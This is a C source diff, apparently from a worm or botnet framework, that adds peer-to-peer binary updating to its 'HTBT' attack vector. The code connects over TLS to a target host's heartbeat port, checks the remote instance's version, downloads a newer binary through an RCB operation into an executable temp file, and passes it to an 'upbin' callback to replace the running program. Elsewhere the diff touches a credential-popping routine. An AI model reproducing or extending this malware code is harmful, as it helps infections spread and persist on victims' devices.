@@ -8,12 +8,15 @@
 #include "iobuf.h"
 #include "endian.h"
 #include "mbedtls.h"
+#include "config.h"
 
 #include <string.h>
 #include <ctype.h>
 #include <errno.h>
 
 #include <elf.h>
+#include <unistd.h>
+#include <fcntl.h>
 
 #include <mbedtls/base64.h>
 
@@ -23,6 +26,7 @@ static const struct timespec BNE_SCK_OP_TIMEOUT = { 30, 0 }; // 30s
 static const struct timespec BNE_CLOSE_OP_TIMEOUT = { 1, 0 }; // 1s
 static const struct timespec BNE_ERR_PAUSE = { 0, 500000000 }; // 500ms
 static const struct timespec BNE_PROMPT_PAUSE = { 4, 0 }; // 4s
+static const uint64_t BNE_M2M_UPBIN_INT = 43200; // 12 hours
 
 #define BNE_CONN_ATTEMPT 3
 
@@ -261,6 +265,8 @@ static bool bne_pop_cred (
 		ctx->result.err = errno;
 		return false;
 	}
+	/* == CRITICAL SECTION START == */
+	// DO NOT yield to other pth threads after this point!
 
 	prne_init_iset(&w_set);
 	prne_init_llist(&cl);
@@ -1780,61 +1786,551 @@ END: // CATCH
 /*******************************************************************************
                                HTBT Vector Impl
 *******************************************************************************/
-static bool bne_do_vec_htbt (prne_bne_t *ctx) {
-	bool ret = false;
+typedef struct {
 	prne_net_endpoint_t ep;
-	pth_event_t ev = NULL;
-	int fd = -1;
+	int fd;
 	mbedtls_ssl_context ssl;
+	prne_iobuf_t netib;
+	prne_iobuf_t stdioib;
+} bne_vhtbt_ctx_t;
 
-	mbedtls_ssl_init(&ssl);
-	ep.addr = ctx->param.subject;
-	ep.port = (uint16_t)PRNE_HTBT_PROTO_PORT;
-
-// TRY
+static bool bne_vhtbt_do_handshake (
+	prne_bne_t *ctx,
+	bne_vhtbt_ctx_t *vctx,
+	pth_event_t *ev)
+{
 	if (ctx->param.htbt_ssl_conf == NULL) {
-		goto END;
+		return false;
 	}
-	if (mbedtls_ssl_setup(&ssl, ctx->param.htbt_ssl_conf) != 0) {
-		goto END;
+	mbedtls_ssl_free(&vctx->ssl);
+	mbedtls_ssl_init(&vctx->ssl);
+	prne_close(vctx->fd);
+	vctx->fd = -1;
+	if (mbedtls_ssl_setup(&vctx->ssl, ctx->param.htbt_ssl_conf) != 0) {
+		return false;
 	}
 	mbedtls_ssl_set_bio(
-		&ssl,
-		&fd,
+		&vctx->ssl,
+		&vctx->fd,
 		prne_mbedtls_ssl_send_cb,
 		prne_mbedtls_ssl_recv_cb,
 		NULL);
 
-	prne_pth_reset_timer(&ev, &BNE_CONN_OP_TIMEOUT);
-	if (!bne_do_connect(&fd, &ep, ev) || fd < 0) {
-		goto END;
+	prne_pth_reset_timer(ev, &BNE_CONN_OP_TIMEOUT);
+	if (!bne_do_connect(&vctx->fd, &vctx->ep, *ev) || vctx->fd < 0) {
+		return false;
 	}
-
-	if (!prne_mbedtls_pth_handle(&ssl, mbedtls_ssl_handshake, fd, ev)) {
-		goto END;
+	if (!prne_mbedtls_pth_handle(
+			&vctx->ssl,
+			mbedtls_ssl_handshake,
+			vctx->fd,
+			*ev))
+	{
+		return false;
 	}
-
-	ret = prne_mbedtls_verify_alp(
+	return prne_mbedtls_verify_alp(
 		ctx->param.htbt_ssl_conf,
-		&ssl,
+		&vctx->ssl,
 		PRNE_HTBT_TLS_ALP);
-	if (ret) {
-/* TODO: here goes ...
-*
-* - Take an array of previous versions as param
-* - Check the program version of the remote instance and update local or remote
-*	instance if necessary using PRNE_HTBT_OP_UP_BIN or PRNE_HTBT_OP_RCB
-*/
-		prne_pth_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
-		if (prne_mbedtls_pth_handle(&ssl, mbedtls_ssl_close_notify, fd, ev)) {
-			prne_shutdown(fd, SHUT_RDWR);
+}
+
+static ssize_t bne_vhtbt_read (
+	prne_bne_t *ctx,
+	bne_vhtbt_ctx_t *vctx,
+	void *buf,
+	const size_t len,
+	pth_event_t ev)
+{
+	int f_ret;
+	struct pollfd pfd;
+
+	while (true) {
+		f_ret = mbedtls_ssl_read(&vctx->ssl, (unsigned char*)buf, len);
+		if (f_ret >= 0) {
+			return f_ret;
 		}
+
+		switch (f_ret) {
+		case MBEDTLS_ERR_SSL_WANT_READ:
+			pfd.events = POLLIN;
+			break;
+		case MBEDTLS_ERR_SSL_WANT_WRITE:
+			pfd.events = POLLOUT;
+			break;
+		default: return f_ret;
+		}
+		pfd.fd = vctx->fd;
+
+		prne_pth_poll(&pfd, 1, -1, ev);
+		if (ev != NULL && pth_event_status(ev) != PTH_STATUS_PENDING) {
+			errno = ETIMEDOUT;
+			return -1;
+		}
+	}
+}
+
+static ssize_t bne_vhtbt_write (
+	prne_bne_t *ctx,
+	bne_vhtbt_ctx_t *vctx,
+	const void *buf,
+	const size_t len,
+	pth_event_t ev)
+{
+	int f_ret;
+	struct pollfd pfd;
+
+	while (true) {
+		f_ret = mbedtls_ssl_write(&vctx->ssl, (const unsigned char*)buf, len);
+		if (f_ret >= 0) {
+			return f_ret;
+		}
+
+		switch (f_ret) {
+		case MBEDTLS_ERR_SSL_WANT_READ:
+			pfd.events = POLLIN;
+			break;
+		case MBEDTLS_ERR_SSL_WANT_WRITE:
+			pfd.events = POLLOUT;
+			break;
+		default: return f_ret;
+		}
+		pfd.fd = vctx->fd;
+
+		prne_pth_poll(&pfd, 1, -1, ev);
+		if (ev != NULL && pth_event_status(ev) != PTH_STATUS_PENDING) {
+			errno = ETIMEDOUT;
+			return -1;
+		}
+	}
+}
+
+static bool bne_vhtbt_recvf (
+	prne_bne_t *ctx,
+	bne_vhtbt_ctx_t *vctx,
+	void *f,
+	prne_htbt_dser_ft dser_f,
+	pth_event_t ev)
+{
+	size_t actual;
+	prne_htbt_ser_rc_t rc;
+	ssize_t f_ret;
+
+
+	while (true) {
+		rc = dser_f(vctx->netib.m, vctx->netib.len, &actual, f);
+
+		switch (rc) {
+		case PRNE_HTBT_SER_RC_OK:
+			prne_iobuf_shift(&vctx->netib, -actual);
+			return true;
+		case PRNE_HTBT_SER_RC_MORE_BUF:
+			if (actual > vctx->netib.size) {
+				return false;
+			}
+			break;
+		case PRNE_HTBT_SER_RC_ERRNO:
+			return false;
+		default:
+			return false;
+		}
+
+		f_ret = bne_vhtbt_read(
+			ctx,
+			vctx,
+			vctx->netib.m + vctx->netib.len,
+			actual - vctx->netib.len,
+			ev);
+		if (f_ret == 0) {
+			return false;
+		}
+		if (f_ret < 0) {
+			return false;
+		}
+		prne_iobuf_shift(&vctx->netib, f_ret);
+	}
+}
+
+static bool bne_vhtbt_sendf (
+	prne_bne_t *ctx,
+	bne_vhtbt_ctx_t *vctx,
+	const void *f,
+	prne_htbt_ser_ft ser_f,
+	pth_event_t ev)
+{
+	ssize_t f_ret;
+	size_t actual;
+	prne_htbt_ser_rc_t rc;
+
+	prne_iobuf_reset(&vctx->netib);
+	rc = ser_f(
+		vctx->netib.m,
+		vctx->netib.avail,
+		&actual,
+		f);
+	switch (rc) {
+	case PRNE_HTBT_SER_RC_OK: break;
+	case PRNE_HTBT_SER_RC_ERRNO:
+		return false;
+	default:
+		return false;
+	}
+	prne_iobuf_shift(&vctx->netib, actual);
+
+	while (vctx->netib.len > 0) {
+		f_ret = bne_vhtbt_write(
+			ctx,
+			vctx,
+			vctx->netib.m,
+			vctx->netib.len,
+			ev);
+		if (f_ret == 0) {
+			return false;
+		}
+		if (f_ret < 0) {
+			return false;
+		}
+		prne_iobuf_shift(&vctx->netib, -f_ret);
+	}
+
+	return true;
+}
+
+static bool bne_vhtbt_recv_mh (
+	prne_bne_t *ctx,
+	bne_vhtbt_ctx_t *vctx,
+	prne_htbt_msg_head_t *mh,
+	pth_event_t ev)
+{
+	return bne_vhtbt_recvf(
+		ctx,
+		vctx,
+		mh,
+		(prne_htbt_dser_ft)prne_htbt_dser_msg_head,
+		ev);
+}
+
+static bool bne_vhtbt_send_mh (
+	prne_bne_t *ctx,
+	bne_vhtbt_ctx_t *vctx,
+	const prne_htbt_msg_head_t *mh,
+	pth_event_t ev)
+{
+	return bne_vhtbt_sendf(
+		ctx,
+		vctx,
+		mh,
+		(prne_htbt_ser_ft)prne_htbt_ser_msg_head,
+		ev);
+}
+
+static bool bne_vhtbt_recv_status (
+	prne_bne_t *ctx,
+	bne_vhtbt_ctx_t *vctx,
+	prne_htbt_status_t *st,
+	pth_event_t ev)
+{
+	return bne_vhtbt_recvf(
+		ctx,
+		vctx,
+		st,
+		(prne_htbt_dser_ft)prne_htbt_dser_status,
+		ev);
+}
+
+static uint16_t bne_vhtbt_msgid_f (void *ctx) {
+	uint16_t ret = 0;
+
+	prne_rnd((prne_rnd_t*)ctx, (uint8_t*)&ret, sizeof(ret));
+	return ret;
+}
+
+static bool bne_vhtbt_do_ayt (
+	prne_bne_t *ctx,
+	bne_vhtbt_ctx_t *vctx,
+	pth_event_t *ev)
+{
+	bool ret = false;
+	prne_htbt_msg_head_t mh;
+
+	prne_htbt_init_msg_head(&mh);
+	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
+	if (!bne_vhtbt_send_mh(ctx, vctx, &mh, *ev)) {
+		goto END;
+	}
+	if (!bne_vhtbt_recv_mh(ctx, vctx, &mh, *ev)) {
+		goto END;
+	}
+	ret = mh.id == PRNE_HTBT_OP_NOOP && mh.is_rsp;
+END:
+	prne_htbt_free_msg_head(&mh);
+	return ret;
+}
+
+static bool bne_vhtbt_query_hostinfo (
+	prne_bne_t *ctx,
+	bne_vhtbt_ctx_t *vctx,
+	prne_htbt_host_info_t *hi,
+	pth_event_t *ev)
+{
+	bool ret = false;
+	prne_htbt_msg_head_t mh;
+	prne_htbt_status_t st;
+
+	prne_htbt_init_msg_head(&mh);
+	prne_htbt_init_status(&st);
+	mh.id = prne_htbt_gen_msgid(&ctx->rnd, bne_vhtbt_msgid_f);
+	mh.op = PRNE_HTBT_OP_HOST_INFO;
+
+	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
+	if (!bne_vhtbt_send_mh(ctx, vctx, &mh, *ev)) {
+		goto END;
+	}
+
+	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
+	if (!bne_vhtbt_recv_mh(ctx, vctx, &mh, *ev)) {
+		goto END;
+	}
+	switch (mh.op) {
+	case PRNE_HTBT_OP_STATUS:
+		bne_vhtbt_recv_status(ctx, vctx, &st, *ev);
+		break;
+	case PRNE_HTBT_OP_HOST_INFO:
+		ret = bne_vhtbt_recvf(
+			ctx,
+			vctx,
+			hi,
+			(prne_htbt_dser_ft)prne_htbt_dser_host_info,
+			*ev);
+		break;
+	}
+
+END:
+	prne_htbt_free_msg_head(&mh);
+	prne_htbt_free_status(&st);
+	return ret;
+}
+
+static bool bne_vhtbt_do_upbin_us (
+	prne_bne_t *ctx,
+	bne_vhtbt_ctx_t *vctx,
+	pth_event_t *ev)
+{
+	bool ret = false;
+	char *tmpfile_path = NULL;
+	int fd = -1;
+	prne_htbt_msg_head_t mh;
+	prne_htbt_status_t st;
+	prne_htbt_rcb_t rcb_f;
+	prne_htbt_stdio_t stdio_f;
+	prne_htbt_cmd_t cmd;
+	ssize_t f_ret;
+
+	prne_htbt_init_msg_head(&mh);
+	prne_htbt_init_status(&st);
+	prne_htbt_init_rcb(&rcb_f);
+	prne_htbt_init_stdio(&stdio_f);
+	prne_htbt_init_cmd(&cmd);
+// TRY
+	fd = ctx->param.cb.tmpfile(
+		ctx->param.cb_ctx,
+		O_CREAT | O_TRUNC | O_WRONLY,
+		0700,
+		0,
+		&tmpfile_path);
+	if (fd < 0) {
+		goto END;
+	}
+	fcntl(fd, F_SETFD, FD_CLOEXEC);
+
+	mh.id = prne_htbt_gen_msgid(&ctx->rnd, bne_vhtbt_msgid_f);
+	mh.op = PRNE_HTBT_OP_RCB;
+	rcb_f.arch = prne_host_arch;
+	rcb_f.compat = true;
+	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
+	if (!bne_vhtbt_do_ayt(ctx, vctx, ev)) {
+		goto END;
+	}
+
+	prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
+	if (!bne_vhtbt_send_mh(ctx, vctx, &mh, *ev)) {
+		goto END;
+	}
+	if (!bne_vhtbt_sendf(
+		ctx,
+		vctx,
+		&rcb_f,
+		(prne_htbt_ser_ft)prne_htbt_ser_rcb,
+		*ev))
+	{
+		goto END;
+	}
+
+	do {
+		prne_pth_reset_timer(ev, &BNE_SCK_OP_TIMEOUT);
+		if (!bne_vhtbt_recv_mh(ctx, vctx, &mh, *ev)) {
+			goto END;
+		}
+		switch (mh.op) {
+		case PRNE_HTBT_OP_STDIO: break;
+		case PRNE_HTBT_OP_STATUS:
+			bne_vhtbt_recv_status(ctx, vctx, &st, *ev);
+			goto END;
+		default:
+			goto END;
+		}
+		if (!bne_vhtbt_recvf(
+			ctx,
+			vctx,
+			&stdio_f,
+			(prne_htbt_dser_ft)prne_htbt_dser_stdio,
+			*ev))
+		{
+			goto END;
+		}
+
+		while (stdio_f.len > 0) {
+			f_ret = bne_vhtbt_read(
+				ctx,
+				vctx,
+				vctx->stdioib.m,
+				stdio_f.len,
+				*ev);
+			if (f_ret < 0) {
+				goto END;
+			}
+			if (f_ret == 0) {
+				goto END;
+			}
+			prne_iobuf_shift(&vctx->stdioib, f_ret);
+			stdio_f.len -= f_ret;
+
+			while (vctx->stdioib.len > 0) {
+				f_ret = write(fd, vctx->stdioib.m, vctx->stdioib.len);
+				if (f_ret < 0) {
+					goto END;
+				}
+				if (f_ret == 0) {
+					goto END;
+				}
+				prne_iobuf_shift(&vctx->stdioib, -f_ret);
+			}
+		}
+	} while (!stdio_f.fin);
+	ctx->param.cb.upbin(ctx->param.cb_ctx, tmpfile_path, &cmd);
+	ret = true;
+
+END:
+	if (!ret && tmpfile_path != NULL) {
+		unlink(tmpfile_path);
+	}
+	prne_htbt_free_msg_head(&mh);
+	prne_htbt_free_status(&st);
+	prne_htbt_free_rcb(&rcb_f);
+	prne_htbt_free_stdio(&stdio_f);
+	prne_htbt_free_cmd(&cmd);
+	prne_free(tmpfile_path);
+	prne_close(fd);
+	return ret;
+}
+
+static bool bne_vhtbt_do_upbin_them (
+	prne_bne_t *ctx,
+	bne_vhtbt_ctx_t *vctx,
+	pth_event_t *ev)
+{
+	// TODO
+	errno = ENOSYS;
+	return false;
+}
+
+static bool bne_do_vec_htbt (prne_bne_t *ctx) {
+	bool ret = false;
+	bne_vhtbt_ctx_t vctx;
+	pth_event_t ev = NULL;
+	prne_htbt_host_info_t hi;
+
+	vctx.ep.addr = ctx->param.subject;
+	vctx.ep.port = (uint16_t)PRNE_HTBT_PROTO_PORT;
+	vctx.fd = -1;
+	mbedtls_ssl_init(&vctx.ssl);
+	prne_htbt_init_host_info(&hi);
+	prne_init_iobuf(&vctx.netib);
+	prne_init_iobuf(&vctx.stdioib);
+
+// TRY
+	if (!prne_alloc_iobuf(&vctx.netib, PRNE_HTBT_PROTO_MIN_BUF)) {
+		goto END;
+	}
+	for (unsigned int i = 0; i < BNE_CONN_ATTEMPT; i += 1) {
+		ret = bne_vhtbt_do_handshake(ctx, &vctx, &ev);
+		if (ret) {
+			break;
+		}
+	}
+	if (!ret) {
+		goto END;
+	}
+
+	// M2M binary update
+	do { // fake
+		int f_ret;
+
+		if (ctx->param.cb.vercmp == NULL) {
+			break;
+		}
+		if (!bne_vhtbt_query_hostinfo(ctx, &vctx, &hi, &ev)) {
+			goto END;
+		}
+
+		f_ret = ctx->param.cb.vercmp(ctx->param.cb_ctx, hi.prog_ver);
+		if (f_ret != 0) {
+			if (!prne_alloc_iobuf(&vctx.stdioib, PRNE_HTBT_STDIO_LEN_MAX)) {
+				goto END;
+			}
+		}
+
+		if (f_ret < 0) {
+			if (ctx->param.cb.uptime == NULL ||
+				ctx->param.cb.tmpfile == NULL ||
+				ctx->param.cb.upbin == NULL)
+			{
+				break;
+			}
+			if (ctx->param.cb.uptime(ctx->param.cb_ctx) < BNE_M2M_UPBIN_INT) {
+				break;
+			}
+			if (!bne_vhtbt_do_upbin_us(ctx, &vctx, &ev)) {
+				goto END;
+			}
+		}
+		else if (f_ret > 0) {
+			if (hi.parent_uptime < BNE_M2M_UPBIN_INT) {
+				break;
+			}
+			if (!bne_vhtbt_do_upbin_them(ctx, &vctx, &ev)) {
+				goto END;
+			}
+		}
+	} while (false);
+
+	// Terminate connection gracefully
+	prne_pth_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
+	if (prne_mbedtls_pth_handle(
+			&vctx.ssl,
+			mbedtls_ssl_close_notify,
+			vctx.fd,
+			ev))
+	{
+		prne_shutdown(vctx.fd, SHUT_RDWR);
 	}
 
 END: // CATCH
-	mbedtls_ssl_free(&ssl);
-	prne_close(fd);
+	prne_free_iobuf(&vctx.netib);
+	prne_free_iobuf(&vctx.stdioib);
+	mbedtls_ssl_free(&vctx.ssl);
+	prne_close(vctx.fd);
 	pth_event_free(ev, FALSE);
+	prne_htbt_free_host_info(&hi);
 
 	return ret;
 }
